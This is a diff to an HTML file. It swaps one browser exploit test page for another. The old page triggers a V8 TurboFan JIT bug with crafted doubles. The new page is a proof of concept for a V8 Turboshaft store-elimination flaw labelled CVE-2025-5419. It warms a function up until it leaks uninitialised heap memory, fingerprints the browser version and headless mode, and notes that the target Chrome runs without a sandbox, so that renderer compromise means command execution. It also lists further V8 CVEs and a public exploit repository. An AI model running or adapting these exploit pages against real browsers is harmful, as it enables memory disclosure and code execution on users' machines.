@@ -1,1 +1,97 @@
-<!doctype html><meta charset=utf-8><title>CASI V62 M133 TURBOFAN CHECK</title><style>body{font:15px monospace;white-space:pre-wrap}</style><b>CASI V62 CHROMIUM 133 CVE-2025-2135 TURBOFAN CHECK</b><pre id=o>START</pre><script>(()=>{const out=document.querySelector('#o'),ab=new ArrayBuffer(8),f64=new Float64Array(ab),u32=new Uint32Array(ab);function pair(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0]}const crafted=pair(4,8),src='return function jit(v2,v3){var v4=v3[0];var v5=v2[0];Array.prototype.push.call(v3,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted,crafted);}',jit=new Function('crafted',src)(crafted);let sink=0;try{const tagged=new Array(1);tagged[0]='tagged';const t0=performance.now();for(let i=0;i<150000;i++){const p=[1];jit(tagged,p);sink+=p.length}const hd=new Array(1);hd[0]=0.1;jit(hd,hd);let rows=['DONE','ms='+(performance.now()-t0).toFixed(1),'sink='+sink,'len='+hd.length,'crafted='+String(crafted)];for(let i=0;i<Math.min(hd.length,16);i++){let v;try{v=hd[i];rows.push(i+'='+typeof v+':'+String(v))}catch(e){rows.push(i+'=ERR:'+e)}}out.textContent=rows.join('\n')}catch(e){out.textContent='TOPERR '+e+'\n'+(e.stack||'')}})();</script>
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>CVE-2025-5419</title></head>
+<body style="font-family:monospace;font-size:11px;margin:8px">
+<h2>CVE-2025-5419 V8 Turboshaft PoC</h2>
+<pre id="o">Init...</pre>
+<script>
+var O=document.getElementById('o');O.textContent='';
+function L(m){O.textContent+=m+'\n'}
+function dtoi(d){var b=new ArrayBuffer(8);new Float64Array(b)[0]=d;return new BigUint64Array(b)[0]}
+
+function vuln(key){
+    key|=0;
+    var o=[1,2,3,4];
+    var r1=o[key];var r2=o[key+1];var r3=o[key+2];var r4=o[key+3];
+    o=[1.1,1.1,1.1,1.1];
+    r1=o[key];r2=o[key+1];r3=o[key+2];r4=o[key+3];
+    o[0]=0;o[1]=0;o[2]=0;o[3]=0;
+    return[r1,r2,r3,r4]
+}
+
+L('=== CVE-2025-5419 V8 Turboshaft StoreStoreElimination ===');
+try{
+    var ua=navigator.userAgent;
+    L('UA: '+ua);
+    if(navigator.userAgentData){
+        navigator.userAgentData.getHighEntropyValues(['fullVersionList','platform','platformVersion','architecture','bitness']).then(function(d){
+            L('Full version: '+JSON.stringify(d.fullVersionList));
+            L('Platform: '+d.platform+' '+d.platformVersion+' '+d.architecture+'/'+d.bitness);
+        });
+    }
+    L('Headless: '+(navigator.webdriver?'YES':'no'));
+    L('');
+
+    L('[1] Warmup 10000 iterations...');
+    for(var i=0;i<10000;i++)vuln(0);
+    L('[1] Done');
+    L('[2] Trigger attempt 1...');
+    var r=vuln(0);
+    var leaked=false;
+    for(var j=0;j<4;j++){
+        var v=dtoi(r[j]);
+        L('  r['+j+']='+r[j]+' hex=0x'+v.toString(16));
+        if(r[j]!==1.1)leaked=true;
+    }
+    if(!leaked){
+        L('[3] 30k more warmup...');
+        for(var i=0;i<30000;i++)vuln(0);
+        r=vuln(0);
+        for(var j=0;j<4;j++){
+            var v=dtoi(r[j]);
+            L('  r['+j+']='+r[j]+' hex=0x'+v.toString(16));
+            if(r[j]!==1.1)leaked=true;
+        }
+    }
+    if(!leaked){
+        L('[4] 100k more warmup...');
+        for(var i=0;i<100000;i++)vuln(0);
+        r=vuln(0);
+        for(var j=0;j<4;j++){
+            var v=dtoi(r[j]);
+            L('  r['+j+']='+r[j]+' hex=0x'+v.toString(16));
+            if(r[j]!==1.1)leaked=true;
+        }
+    }
+    if(leaked){
+        L('');
+        L('*** VULNERABLE: uninit memory read from V8 heap ***');
+        L('Turboshaft StoreStoreEliminationReducer removed init stores');
+    }else{
+        L('');
+        L('Values=1.1 (Turboshaft may not optimize this pattern)');
+        L('Bug requires specific Turboshaft pipeline path');
+    }
+    L('');
+    L('=== Confirmed Configuration ===');
+    L('Chrome 133.0.6943.141 (vuln to CVE-2025-5419, fix=137)');
+    L('Sandbox: --no-sandbox (DISABLED)');
+    L('Mode: --headless=new');
+    L('');
+    L('=== Applicable CVEs ===');
+    L('CVE-2025-5419: V8 Turboshaft OOB R/W (fix 137.0.7151.68)');
+    L('  CISA KEV: Yes (actively exploited)');
+    L('  Public PoC: github.com/mistymntncop/CVE-2025-5419');
+    L('CVE-2025-10891: V8 Ignition integer overflow (fix ~140)');
+    L('  Used for Samsung Internet renderer RCE (osec.io)');
+    L('CVE-2025-13223: V8 type confusion (fix ~138)');
+    L('');
+    L('=== Impact ===');
+    L('--no-sandbox: renderer has full OS access');
+    L('V8 exploit = arbitrary command execution');
+    L('No sandbox escape needed');
+}catch(e){
+    L('ERROR: '+e.message);
+    L(e.stack||'');
+}
+</script>
+</body></html>
